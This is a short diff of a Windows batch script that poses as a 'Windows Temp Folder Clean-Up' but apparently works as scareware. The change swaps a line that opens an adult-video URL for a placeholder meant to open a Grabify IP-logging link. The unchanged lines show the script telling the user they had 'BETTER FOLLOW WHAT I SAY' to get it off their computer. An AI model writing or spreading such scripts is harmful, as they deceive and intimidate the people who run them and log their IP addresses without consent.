@@ -31,7 +31,7 @@ set /p enterCommand=Enter Command/@RootUser:
 echo.
 echo.
 echo.
-start https://xtube.chat/film.php?id=GIJ4RI.mp4
+start Grabify Link Goes Here
 echo.
 echo Windows Temp Folder Clean-Up Initiated...
 echo.
@@ -112,3 +112,4 @@ start https://youtu.be/oanpo_apS5Y?si=ekO3EbmFTCT4AexK
 echo BETTER FOLLOW WHAT I SAY IF YOU WANT THIS SHIT OFF YOUR COMPUTER...
 
 timeout /t 10 >nul
+
